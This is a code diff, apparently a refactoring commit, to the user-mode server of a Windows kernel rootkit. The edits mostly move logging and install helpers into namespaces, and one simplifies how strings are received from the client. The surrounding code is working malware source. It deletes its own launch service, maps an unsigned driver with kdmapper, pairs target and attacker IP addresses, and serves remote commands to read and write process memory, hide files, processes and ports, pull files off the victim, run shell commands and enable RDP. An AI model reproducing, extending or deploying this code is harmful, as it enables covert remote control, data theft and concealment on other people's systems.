@@ -29,15 +29,15 @@ DWORD ConnectToNamedPipe(HANDLE* PipeHandle, LogFile* MediumLog, BOOL* IsValidPi
 		LastError = GetLastError();
 		if (LastError == ERROR_PIPE_CONNECTED) {
 			*IsValidPipe = TRUE;
-			LogMessage("MainMedium pipe - driver already connected to pipe between creating it and connecting to it!\n", MediumLog, FALSE, 0);
+			RequestHelpers::LogMessage("MainMedium pipe - driver already connected to pipe between creating it and connecting to it!\n", MediumLog, FALSE, 0);
 		}
 		else {
-			LogMessage("MainMedium pipe - error while connecting to pipe\n", MediumLog, TRUE, LastError);
+			RequestHelpers::LogMessage("MainMedium pipe - error while connecting to pipe\n", MediumLog, TRUE, LastError);
 			ClosePipe(PipeHandle);
 		}
 	}
 	else {
-		LogMessage("MainMedium pipe - driver connected to pipe like expected\n", MediumLog, FALSE, 0);
+		RequestHelpers::LogMessage("MainMedium pipe - driver connected to pipe like expected\n", MediumLog, FALSE, 0);
 	}
 	return LastError;
 }
@@ -53,7 +53,7 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 	ROOTKIT_MEMORY OprBuffer;
 	PVOID LocalRead = NULL;
 	PVOID AttrBuffer = NULL;
-	PVOID InitialString = NULL;  // Usually receives a module name but can also receive other strings (such as debug message)
+	char* InitialString = NULL;  // Usually receives a module name but can also receive other strings (such as debug message)
 	ULONG ReadSize = 0;
 	ULONG InitialSize = 0;
 	ULONG64 AttrBufferSize = 0;
@@ -87,12 +87,12 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 			result = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0, MediumLog);
 			if (result.err || result.value != sizeof(RootStat)) {
 				if (result.Term) {
-					LogMessage("Critical error occured, closing connection with specific client..\n", MediumLog, TRUE, GetLastError());
+					RequestHelpers::LogMessage("Critical error occured, closing connection with specific client..\n", MediumLog, TRUE, GetLastError());
 					return TerminateMedium(&SndInfo, PipeHandle, IsValidPipe, 0);
 				}
 				break;
 			}
-			if (ShouldQuit()) {
+			if (RequestHelpers::ShouldQuit()) {
 
 				// Special error/event occured, should quit and stop working:
 				RootStat = RKOP_TERMINATE;
@@ -100,7 +100,7 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 				if (!result.err && result.value == sizeof(RootStat)) {
 					result = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0, MediumLog);
 					if (!result.err && result.value == sizeof(RootStat) && RootStat == RKOP_TERMINATE) {
-						LogMessage("Termination initiated from here accepted by client\n", MediumLog, FALSE, 0);
+						RequestHelpers::LogMessage("Termination initiated from here accepted by client\n", MediumLog, FALSE, 0);
 					}
 				}
 				return TerminateMedium(&SndInfo, PipeHandle, IsValidPipe, -1);
@@ -115,27 +115,14 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 
 
 			// Receive the main module for the function:
-			result = root_internet::RecvData(SndInfo.AsoSock, sizeof(InitialSize), &InitialSize, FALSE, 0, MediumLog);
-			if (result.err || result.value != sizeof(InitialSize)) {
+			if (!root_internet::GetString(SndInfo.AsoSock, &InitialString, MediumLog)) {
+				ValidInit = FALSE;
 				goto InitStringValidate;
 			}
-			InitialString = malloc(InitialSize);
-			if (InitialString == NULL) {
-				MdlMalloc = 0;
-				root_internet::SendData(SndInfo.AsoSock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0, MediumLog);  // Send MEMALLOC error
-				goto InitStringValidate;
-			}
-			result = root_internet::SendData(SndInfo.AsoSock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0, MediumLog);
-			if (result.err || result.value != sizeof(MdlMalloc)) {
-				goto InitStringValidate;
-			}
-			result = root_internet::RecvData(SndInfo.AsoSock, InitialSize, InitialString, FALSE, 0, MediumLog);
-			if (!result.err && result.value == InitialSize) {
-				ValidInit = TRUE;
-				LogMessage("Init string received - ", MediumLog, FALSE, 0);
-				LogMessage((char*)InitialString, MediumLog, FALSE, 0);
-				LogMessage("\n", MediumLog, FALSE, 0);
-			}
+			ValidInit = TRUE;
+			RequestHelpers::LogMessage("Init string received - ", MediumLog, FALSE, 0);
+			RequestHelpers::LogMessage(InitialString, MediumLog, FALSE, 0);
+			RequestHelpers::LogMessage("\n", MediumLog, FALSE, 0);
 
 		InitStringValidate:
 			if (!ValidInit) {
@@ -156,7 +143,7 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 				// Write into process virtual memory (from user supplied buffer / another process):
 				OprResult = DriverCalls::WriteKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
 				if (OprResult != 1) {
-					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
+					RequestHelpers::LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
 				}
 				free(InitialString);
 				break;
@@ -166,7 +153,7 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 				// Read from process virtual memory:
 				OprResult = DriverCalls::ReadKernelCall(SndInfo.AsoSock, LocalRead, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
 				if (OprResult != 1) {
-					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
+					RequestHelpers::LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
 				}
 				free(LocalRead);
 				free(InitialString);
@@ -175,10 +162,10 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 			case RKOP_MDLBASE:
 
 				// Get the base address of a process module (executable) in memory:
-				LogMessage("No extra buffer parameters for getting the module base..\n", MediumLog, FALSE, 0);
+				RequestHelpers::LogMessage("No extra buffer parameters for getting the module base..\n", MediumLog, FALSE, 0);
 				OprResult = DriverCalls::MdlBaseKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
 				if (OprResult != 1) {
-					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
+					RequestHelpers::LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
 				}
 				else {
 					printf("Base address of %s in memory: %p\n", (char*)InitialString, OprBuffer.Out);
@@ -189,29 +176,29 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 			case RKOP_SYSINFO:
 
 				// return specific information about the target system (with ZwQuerySystemInformation):
-				if (!ValidateInfoTypeString((char*)InitialString)) {
-					LogMessage("Client sent invalid system info string\n", MediumLog, TRUE, GetLastError());
+				if (!RequestHelpers::ValidateInfoTypeString((char*)InitialString)) {
+					RequestHelpers::LogMessage("Client sent invalid system info string\n", MediumLog, TRUE, GetLastError());
 					free(InitialString);
 					break;
 				}
 
 				result = root_internet::RecvData(SndInfo.AsoSock, sizeof(AttrBufferSize), &AttrBufferSize, FALSE, 0, MediumLog);
 				if (result.err || result.value != sizeof(AttrBufferSize)) {
-					LogMessage("Cannot get size of initial system buffer\n", MediumLog, TRUE, GetLastError());
+					RequestHelpers::LogMessage("Cannot get size of initial system buffer\n", MediumLog, TRUE, GetLastError());
 					free(InitialString);
 					break;
 				}
 
 				AttrBuffer = malloc(AttrBufferSize);
 				if (AttrBuffer == NULL) {
-					LogMessage("Cannot allocate initial system buffer\n", MediumLog, TRUE, GetLastError());
+					RequestHelpers::LogMessage("Cannot allocate initial system buffer\n", MediumLog, TRUE, GetLastError());
 					free(InitialString);
 					SysErrInit = memalloc;
 				}
 				if (SysErrInit == successful) {
 					result = root_internet::RecvData(SndInfo.AsoSock, (int)AttrBufferSize, AttrBuffer, FALSE, 0, MediumLog);
 					if (result.err || result.value != AttrBufferSize) {
-						LogMessage("Cannot get initial system buffer\n", MediumLog, TRUE, GetLastError());
+						RequestHelpers::LogMessage("Cannot get initial system buffer\n", MediumLog, TRUE, GetLastError());
 						free(AttrBuffer);
 						free(InitialString);
 						break;
@@ -220,10 +207,10 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 
 				OprResult = DriverCalls::SysInfoKernelCall(SndInfo.AsoSock, &OprBuffer, AttrBuffer, (char*)InitialString, SysErrInit, AttrBufferSize, PipeHandle, MediumLog);
 				if (OprResult != 1) {
-					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
+					RequestHelpers::LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
 				}
 				else {
-					LogMessage("Success operation system information\n", MediumLog, FALSE, 0);
+					RequestHelpers::LogMessage("Success operation system information\n", MediumLog, FALSE, 0);
 				}
 				free(AttrBuffer);
 				free(InitialString);
@@ -232,10 +219,10 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 			case RKOP_PRCMALLOC:
 
 				// Allocate memory in a specific process (and leave it committed for now):
-				LogMessage("No extra buffer parameters for allocating specific memory..\n", MediumLog, FALSE, 0);
+				RequestHelpers::LogMessage("No extra buffer parameters for allocating specific memory..\n", MediumLog, FALSE, 0);
 				OprResult = DriverCalls::AllocSpecKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
 				if (OprResult != 1) {
-					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
+					RequestHelpers::LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
 				}
 				free(InitialString);
 				break;
@@ -245,7 +232,7 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 				// Hide file/folder by dynamic request:
 				OprResult = DriverCalls::HideFileKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
 				if (OprResult != 1) {
-					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
+					RequestHelpers::LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
 				}
 				free(InitialString);
 				break;
@@ -255,7 +242,7 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 				// Hide process by dynamic request:
 				OprResult = DriverCalls::HideProcessKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
 				if (OprResult != 1) {
-					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
+					RequestHelpers::LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
 				}
 				free(InitialString);
 				break;
@@ -265,7 +252,7 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 				// Hide ports by dynamic request:
 				OprResult = DriverCalls::HidePortCommunicationKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
 				if (OprResult != 1) {
-					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
+					RequestHelpers::LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
 				}
 				free(InitialString);
 				break;
@@ -275,7 +262,7 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 				// Get file from target machine:
 				OprResult = RegularRequests::DownloadFileRequest(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, MediumLog);
 				if (OprResult != 1) {
-					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
+					RequestHelpers::LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
 				}
 				free(InitialString);
 				break;
@@ -285,7 +272,7 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 				// Execute cmd command:
 				OprResult = RegularRequests::RemoteCommandRequest(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, MediumLog);
 				if (OprResult != 1) {
-					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
+					RequestHelpers::LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
 				}
 				free(InitialString);
 				break;
@@ -295,14 +282,14 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 				// Activate RDP service:
 				OprResult = RegularRequests::ActivateRDPRequest(SndInfo.AsoSock, &OprBuffer, MediumLog);
 				if (OprResult != 1) {
-					LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
+					RequestHelpers::LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
 				}
 				free(InitialString);
 				break;
 
 			default:
 				if (result.Term) {
-					LogMessage("Critical error occured, closing connection with specific client..\n", MediumLog, TRUE, GetLastError());
+					RequestHelpers::LogMessage("Critical error occured, closing connection with specific client..\n", MediumLog, TRUE, GetLastError());
 					return TerminateMedium(&SndInfo, PipeHandle, IsValidPipe, -1);
 				}
 				break;
@@ -317,7 +304,7 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 				return TerminateMedium(NULL, PipeHandle, IsValidPipe, -1);  // No need to close socket
 			}
 			OprResult = 0;
-			LogMessage("Current medium iteration finished\n", MediumLog, FALSE, 0);
+			RequestHelpers::LogMessage("Current medium iteration finished\n", MediumLog, FALSE, 0);
 		}
 	}
 	return TerminateMedium(&SndInfo, PipeHandle, IsValidPipe, 0);
@@ -346,25 +333,25 @@ int main(int argc, char* argv[]) {
 
 	// Destroy launching service:
 	if (system("sc stop RootAuto > nul && sc delete RootAuto > nul") == -1) {
-		LogMessage("Cannot destroy launching service\n", &MediumLog, TRUE, GetLastError());
+		RequestHelpers::LogMessage("Cannot destroy launching service\n", &MediumLog, TRUE, GetLastError());
 		MediumLog.CloseLog();
 		return 0;
 	}
-	LogMessage("Destroyed launching service!\n", &MediumLog, FALSE, 0);
+	RequestHelpers::LogMessage("Destroyed launching service!\n", &MediumLog, FALSE, 0);
 
 
 	// Create dispatch function that will be triggered for CTRL_SHUTDOWN_EVENT:
-	if (!SetConsoleCtrlHandler(CtrlHandler, TRUE)) {
-		LogMessage("Cannot create control handler to handle reboots\n", &MediumLog, TRUE, GetLastError());
+	if (!SetConsoleCtrlHandler(RootkitInstall::CtrlHandler, TRUE)) {
+		RequestHelpers::LogMessage("Cannot create control handler to handle reboots\n", &MediumLog, TRUE, GetLastError());
 		MediumLog.CloseLog();
 		return 0;
 	}
-	LogMessage("Created control handler to handle reboots!\n", &MediumLog, FALSE, 0);
+	RequestHelpers::LogMessage("Created control handler to handle reboots!\n", &MediumLog, FALSE, 0);
 
 
 	// Get IP addresses of target and attacker:
 	if (!address_config::MatchIpAddresses(MediumIP, ClientIP, AttackAddresses)) {
-		LogMessage("Cannot find the target address and the matching attacker address\n", &MediumLog, TRUE, GetLastError());
+		RequestHelpers::LogMessage("Cannot find the target address and the matching attacker address\n", &MediumLog, TRUE, GetLastError());
 		MediumLog.CloseLog();
 		return 0;
 	}
@@ -372,7 +359,7 @@ int main(int argc, char* argv[]) {
 
 
 	// Make sure that all depended-on files exist on target machine (folders + files):
-	LastError = VerifyDependencies(ClientIP);
+	LastError = RootkitInstall::VerifyDependencies(ClientIP);
 	if (LastError != 0) {
 		return LastError;
 	}
@@ -386,17 +373,17 @@ int main(int argc, char* argv[]) {
 
 
 	// Activate kdmapper with driver as parameter:
-	ReturnStatus = RealTime(TRUE);
+	ReturnStatus = RootkitInstall::RealTime(TRUE);
 	if (ReturnStatus.Represent != ERROR_SUCCESS || ReturnStatus.LastError != 0) {
 		return 0;
 	}
 	if (system("C:\\nosusfolder\\verysus\\kdmapper.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys") == -1) {
-		LogMessage("Failed to activate service manager with driver as parameter\n", &MediumLog, TRUE, GetLastError());
+		RequestHelpers::LogMessage("Failed to activate service manager with driver as parameter\n", &MediumLog, TRUE, GetLastError());
 		MediumLog.CloseLog();
 		return 0;
 	}
-	LogMessage("kdmapper mapped driver successfully!\n", &MediumLog, FALSE, 0);
-	ReturnStatus = RealTime(FALSE);
+	RequestHelpers::LogMessage("kdmapper mapped driver successfully!\n", &MediumLog, FALSE, 0);
+	ReturnStatus = RootkitInstall::RealTime(FALSE);
 	if (ReturnStatus.Represent != ERROR_SUCCESS || ReturnStatus.LastError != 0) {
 		return 0;
 	}
@@ -419,7 +406,7 @@ int main(int argc, char* argv[]) {
 	// Set up network structs for main connection with client:
 	root_internet::SetNetStructs(MediumIP, ClientIP, MediumConnectionPort, ClientConnectionPort, ConnectionConfigArray);
 	if (!root_internet::StartComms(ConnectionConfigArray, &MediumLog)) {
-		LogMessage("Quitting (internet/socket communication initiation error)..\n", &MediumLog, TRUE, GetLastError());
+		RequestHelpers::LogMessage("Quitting (internet/socket communication initiation error)..\n", &MediumLog, TRUE, GetLastError());
 		MediumLog.CloseLog();
 		DisconnectNamedPipe(PipeHandle);
 		ClosePipe(&PipeHandle);
@@ -431,10 +418,10 @@ int main(int argc, char* argv[]) {
 	while (TRUE) {
 		MediumSocket = accept(ConnectionConfigArray[0].AsoSock, (sockaddr*)&ConnectionConfigArray[1].AddrInfo, &SockaddrLen);
 		if (MediumSocket == INVALID_SOCKET) {
-			LogMessage("Could not accept connection with socket object\n", &MediumLog, TRUE, WSAGetLastError());
+			RequestHelpers::LogMessage("Could not accept connection with socket object\n", &MediumLog, TRUE, WSAGetLastError());
 			continue;
 		}
-		LogMessage("Initialization of connection succeeded, proceeding to start receiving requests..\n", &MediumLog, FALSE, 0);
+		RequestHelpers::LogMessage("Initialization of connection succeeded, proceeding to start receiving requests..\n", &MediumLog, FALSE, 0);
 		
 		ConnectionConfigArray[1].AsoSock = MediumSocket;
 		MediumResult = ServeClient(ConnectionConfigArray[1], ConnectionConfigArray[0], &PipeHandle, &MediumLog, &IsValidPipe);
@@ -444,7 +431,7 @@ int main(int argc, char* argv[]) {
 		if (MediumResult == -1) {
 
 			// Special "global" reason has made medium disconnect from client:
-			LogMessage("Termination complete\n", &MediumLog, FALSE, 0);
+			RequestHelpers::LogMessage("Termination complete\n", &MediumLog, FALSE, 0);
 			closesocket(ConnectionConfigArray[0].AsoSock);
 			WSACleanup();
 			MediumLog.CloseLog();
